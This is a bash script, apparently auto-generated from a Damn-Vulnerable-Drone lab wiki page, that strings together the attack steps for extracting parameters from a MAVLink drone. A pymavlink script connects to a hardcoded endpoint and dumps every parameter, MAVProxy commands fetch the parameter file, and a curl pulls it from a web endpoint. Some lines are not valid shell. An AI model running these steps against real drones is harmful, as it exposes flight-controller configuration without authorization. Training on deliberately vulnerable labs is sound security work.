#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Parameter-Extraction.md
# Created: 2025-11-23 16:46:38
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=parameter-extraction src=Parameter-Extraction.md"
log "[BLOCK 1] type=shell"
mavlink.message.name == "PARAM_VALUE"

log "[BLOCK 2] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil

master = mavutil.mavlink_connection('tcp:10.13.0.3:5760')
master.wait_heartbeat()
print("[+] Connected")

master.mav.param_request_list_send(
    master.target_system,
    master.target_component
)

while True:
    msg = master.recv_match(type='PARAM_VALUE', blocking=True)
    print(f"{msg.param_id.decode('utf-8')}: {msg.param_value}")
PY

log "[BLOCK 3] type=shell"
module load mavftp
get /APM/Parameters.parm

log "[BLOCK 4] type=shell"
curl http://localhost:${PORT_WEB}/download/parameters

